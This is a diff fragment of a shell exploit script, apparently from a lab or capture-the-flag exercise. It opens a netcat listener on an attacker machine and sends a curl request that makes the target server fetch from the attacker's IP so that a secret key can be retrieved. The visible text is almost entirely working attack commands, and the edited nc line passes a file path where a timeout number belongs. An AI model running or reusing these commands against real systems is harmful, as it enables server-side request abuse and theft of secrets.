@@ -17,7 +17,7 @@ curl -s -X GET "http://$target_ip:8087" -L > /dev/null
 
 # Tweak the server into downloading resume from our attack box
 echo "2 - RETRIEVING SECRET KEY"
-sudo mate-terminal -- bash -c "nc -lvnp 8087; exec bash" &
+sudo mate-terminal -- bash -c "nc -q /work/10-nc-log.txt -lvnp 8087; exec bash" &
 sleep 10
 curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" &
 
